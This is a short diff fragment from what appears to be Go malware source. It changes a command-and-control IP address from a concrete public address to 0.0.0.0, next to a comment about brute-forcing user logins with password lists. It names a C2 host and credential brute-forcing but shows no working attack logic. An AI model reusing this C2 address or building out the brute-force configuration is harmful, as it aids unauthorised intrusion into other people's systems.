@@ -12,7 +12,7 @@ import (
 )
 
 var (
-	C2ip = "89.116.31.126"
+	C2ip = "0.0.0.0"
 	// config here
 	//brute force <user> : list of passwords
 	passwordMap = map[string][]string{
